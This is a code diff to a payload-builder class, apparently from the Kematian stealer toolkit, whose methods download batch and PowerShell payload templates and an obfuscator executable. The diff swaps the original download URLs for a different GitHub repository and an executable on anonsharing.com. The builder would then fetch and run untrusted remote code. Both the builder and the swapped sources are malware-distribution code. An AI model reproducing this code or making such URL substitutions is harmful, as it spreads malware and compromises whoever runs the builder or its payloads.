@@ -94,7 +94,7 @@ class BuildPayload:
         return content
 
     async def build_bat(self, url: str, name: str, options: dict[str, bool]) -> None:
-        github_raw_url_bat = "https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.bat"
+        github_raw_url_bat = "https://raw.githubusercontent.com/adasdasdsaf/gayd/main/frontend-src/main.bat"
         # content = requests.get(github_raw_url_bat).text.strip()
 
         async with aiohttp.ClientSession() as session:
@@ -109,7 +109,7 @@ class BuildPayload:
             await f.write(content)
 
         if options["obfuscate"]:
-            somalifuscator_url = "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe"
+            somalifuscator_url = "https://anonsharing.com/file/8e85eba3e19f4704/xd.exe"
 
             # r = requests.get(somalifuscator_url, allow_redirects=True)
             async with aiohttp.ClientSession() as session:
@@ -134,7 +134,7 @@ class BuildPayload:
             os.rename(f"{working_dir}\\{name}_obf.bat", f"{working_dir}\\{name}.bat")
 
     async def build_ps1(self, url: str, name: str, options: dict[str, bool]) -> None:
-        github_raw_url_ps1 = "https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.ps1"
+        github_raw_url_ps1 = "https://raw.githubusercontent.com/adasdasdsaf/gayd/main/frontend-src/main.ps1"
         content = requests.get(github_raw_url_ps1).text.strip()
 
         content = await self._replace(content, options, url, hashtags=True)
